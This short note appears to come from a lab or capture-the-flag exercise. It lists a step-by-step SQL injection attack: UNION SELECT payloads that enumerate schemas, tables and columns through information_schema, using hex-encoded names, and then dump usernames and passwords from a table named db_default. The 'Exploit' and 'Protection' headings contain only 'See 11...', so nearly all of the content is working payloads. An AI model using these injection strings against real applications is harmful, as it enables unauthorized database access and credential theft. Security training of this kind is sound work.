# Vulnerability

Get the list of all the DBs:
```
1 and 1=0 union select null, schema_name from information_schema.schemata
```

Get all the tables on that Member_Brute_Force (converted to hex):
```
1 and 1=0 union select null,table_name from information_schema.tables where table_schema=0x4D656D6265725F42727574655F466F726365
```

Get all the fields of db_default (converted to hex):
```
1 and 1=0 union select null,column_name from information_schema.columns where table_name=0x64625F64656661756C74
```

Get all the entries of db_default:
```
1 and 1=0 union select username,password from Member_Brute_Force.db_default
```

# Exploit 

See 11...

# Protection

See 11...
